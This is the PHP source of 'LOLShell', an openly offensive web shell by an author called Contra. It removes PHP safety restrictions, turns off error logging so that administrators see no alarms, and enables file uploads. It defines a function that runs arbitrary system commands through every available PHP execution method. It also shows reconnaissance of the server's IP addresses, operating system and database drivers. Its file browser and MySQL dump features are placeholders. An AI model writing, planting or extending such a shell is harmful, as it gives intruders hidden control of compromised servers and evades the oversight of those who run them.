<?php
  /* LOLShell - Created by Contra, contra@australia.edu */
  /* Insane amount of credit to Ani-Shell and Cyber Anarchy shell where most of the PHP code is from */
  $appVersion = 0.01;

  //Let's initialize a few things for the app, shall we?
  error_reporting(E_ALL);
  ini_restore("safe_mode_include_dir");
  ini_restore("safe_mode_exec_dir");
  ini_restore("disable_functions");
  ini_restore("allow_url_fopen");
  ini_restore("safe_mode");
  ini_restore("open_basedir");

  if (function_exists('ini_set')) {
      ini_set('max_execution_time', 0);
      // No alarming logs
      ini_set('error_log', null);
      // No logging of errors
      ini_set('log_errors', 0);
      // Enable file uploads
      ini_set('file_uploads', 1);
      // allow url fopen
      ini_set('allow_url_fopen', 1);
  } else {
      ini_alter('max_execution_time', 0);
      ini_alter('error_log', null);
      ini_alter('log_errors', 0);
      ini_alter('file_uploads', 1);
      ini_alter('allow_url_fopen', 1);
  }
  $phpVersion = phpversion();
  // Where the fuck am I?
  $self = $_SERVER["PHP_SELF"];
  $sm = @ini_get('safe_mode');
  // Default Directory separator
  $SEPARATOR = "/";
  $os = "Unknown";

  if (stristr(php_uname(), "Windows")) {
      $SEPARATOR = "\\";
      $os = "Windows";
  } elseif (stristr(php_uname(), "Linux")) {
      $os = "Linux";
  }

  function HumanReadableFilesize($size)
  {
      $mod = 1024;
      $units = explode(' ', 'B KB MB GB TB PB');
      for ($i = 0; $size > $mod; $i++) {
          $size /= $mod;
      }

      return round($size, 2) . ' ' . $units[$i];
  }

  function getClientIp()
  {
      return $_SERVER['REMOTE_ADDR'];
  }

  function getServerIp()
  {
      return getenv('SERVER_ADDR');
  }
  function diskSpace()
  {
      return HumanReadableFilesize(disk_total_space("/"));
  }
  function freeSpace()
  {
      return HumanReadableFilesize(disk_free_space("/"));
  }

  function getShellPerms()
  {
      return getFilePermissions(__FILE__);
  }

  function getDisabledFunctions()
  {
      if (!ini_get('disable_functions')) {
          return "<font color='green'>None</font>";
      } else {
          return @ini_get('disable_functions');
      }
  }

  function getFilePermissions($file)
  {
      $perms = fileperms($file);

      if (($perms & 0xC000) == 0xC000) {
          // Socket
          $info = 's';
      } elseif (($perms & 0xA000) == 0xA000) {
          // Symbolic Link
          $info = 'l';
      } elseif (($perms & 0x8000) == 0x8000) {
          // Regular
          $info = '-';
      } elseif (($perms & 0x6000) == 0x6000) {
          // Block special
          $info = 'b';
      } elseif (($perms & 0x4000) == 0x4000) {
          // Directory
          $info = 'd';
      } elseif (($perms & 0x2000) == 0x2000) {
          // Character special
          $info = 'c';
      } elseif (($perms & 0x1000) == 0x1000) {
          // FIFO pipe
          $info = 'p';
      } else {
          // Unknown
          $info = 'u';
      }

      // Owner
      $info .= (($perms & 0x0100) ? 'r' : '-');
      $info .= (($perms & 0x0080) ? 'w' : '-');
      $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

      // Group
      $info .= (($perms & 0x0020) ? 'r' : '-');
      $info .= (($perms & 0x0010) ? 'w' : '-');
      $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

      // World
      $info .= (($perms & 0x0004) ? 'r' : '-');
      $info .= (($perms & 0x0002) ? 'w' : '-');
      $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

      return $info;
  }

  function exec_all($command)
  {
      $output = '';
      if (function_exists('exec')) {
          exec($command, $output);
          $output = join("\n", $output);
      } elseif (function_exists('shell_exec')) {
          $output = shell_exec($command);
      } elseif (function_exists('popen')) {
          // Open the command pipe for reading
          $handle = popen($command, "r");
          if (is_resource($handle)) {
              if (function_exists('fread') && function_exists('feof')) {
                  while (!feof($handle)) {
                      $output .= fread($handle, 512);
                  }
              } elseif (function_exists('fgets') && function_exists('feof')) {
                  while (!feof($handle)) {
                      $output .= fgets($handle, 512);
                  }
              }
          }
          pclose($handle);
      } elseif (function_exists('system')) {
          //start output buffering
          ob_start();
          system($command);
          // Get the ouput
          $output = ob_get_contents();
          // Stop output buffering
          ob_end_clean();
      } elseif (function_exists('passthru')) {
          //start output buffering
          ob_start();
          passthru($command);
          // Get the ouput
          $output = ob_get_contents();
          // Stop output buffering
          ob_end_clean();
      } elseif (function_exists('proc_open')) {
          $descriptorspec = array(1 => array("pipe", "w"),); // stdout is a pipe that the child will write to);
          // This will return the output to an array 'pipes'
          $handle = proc_open($command, $descriptorspec, $pipes);
          if (is_resource($handle)) {
              if (function_exists('fread') && function_exists('feof')) {
                  while (!feof($pipes[1])) {
                      $output .= fread($pipes[1], 512);
                  }
              } elseif (function_exists('fgets') && function_exists('feof')) {
                  while (!feof($pipes[1])) {
                      $output .= fgets($pipes[1], 512);
                  }
              }
          }
          pclose($handle);
      } else {
          $output = "Server has security.";
      }

      return(htmlspecialchars($output));
  }
?>
<html>
<head>
  <meta charset="utf-8">
  <title>LOLShell <?=$appVersion?></title>
  <meta name="description" content="LOLShell <?=$appVersion?> by Contra">
  <meta name="author" content="Contra">

  <link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/themes/dark-hive/jquery-ui.css">

  <script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.0.6/modernizr.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/jquery-ui.min.js"></script>
  <script type="text/javascript">
	$(document).ready(function() {
		$("#info-accordion").accordion({ collapsible: true });
		$("#mysql-accordion").accordion({ collapsible: true });
		$("#navtabs").tabs();
	});
  </script>
</head>
<body bgcolor="black">
<div id="navtabs">
  <ul>
    <li><a href="#sysinfo"><span>System Information</span></a></li>
    <li><a href="#filebrowser"><span>File System</span></a></li>
    <li><a href="#mysql"><span>MySQL</span></a></li>
  </ul>
  <div id="sysinfo">
    <div id="info-accordion">
      <h3><a href="#">General</a></h3>
      <div>
      LOLShell Version: <?php echo $appVersion;?><br/>
      Working Directory: <?php echo getcwd();?><br/>
      Shell Permissions: <?php echo getShellPerms();?><br/>
      Your IP: <?php echo getClientIp();?>
      </div>

      <h3><a href="#">PHP</a></h3>
      <div>
      Version: <?php echo $phpVersion;?><br/>
      Safe Mode: <?php echo $sm ? ("<font color='red'>Enabled</font>") : ("<font color='green'>Disabled</font>");?><br/>
      Curl: <?php echo function_exists('curl_version') ? ("<font color='green'>Enabled</font>") : ("<font color='red'>Disabled</font>");?></li><br/>
      Oracle: <?php echo function_exists('ocilogon') ? ("<font color='green'>Enabled</font>") : ("<font color='red'>Disabled</font>");?><br/>
      MySQL: <?php echo function_exists('mysql_connect') ? ("<font color='green'>Enabled</font>") : ("<font color='red'>Disabled</font>");?><br/>
      MSSQL: <?php echo function_exists('mssql_connect') ? ("<font color='green'>Enabled</font>") : ("<font color='red'>Disabled</font>");?><br/>
      PostgreSQL: <?php echo function_exists('pg_connect') ? ("<font color='green'>Enabled</font>") : ("<font color='red'>Disabled</font>");?><br/>
      Disabled functions: <?php echo getDisabledFunctions();?><br/>
      </div>

      <h3><a href="#">Server</a></h3>
      <div>
      Server IP: <?php echo getServerIp();?><br/>
      Server Admin: <?php echo $_SERVER['SERVER_ADMIN'];?><br/>
      Operating System: <?php echo php_uname();?><br/>
      </div>

      <h3><a href="#">Disk</a></h3>
      <div>
      Total Space: <?php echo diskSpace();?><br/>
      Free Space: <?php echo freeSpace();?><br/>
      </div>
    </div>
  </div>
  <div id="filebrowser">
    <center><iframe src="browse.php" height="60%" width="90%" frameBorder="0"></iframe></center>
  </div>
  <div id="mysql">
    <div id="mysql-accordion">
      <h3><a href="#">Browse</a></h3>
        <div>MySQL Browser here</div>
      <h3><a href="#">Dump</a></h3>
        <div>MySQL Dumper here</div>
      <h3><a href="#">Query</a></h3>
        <div>MySQL Query here</div>
    </div>
  </div>
</div>
</body>
</html>

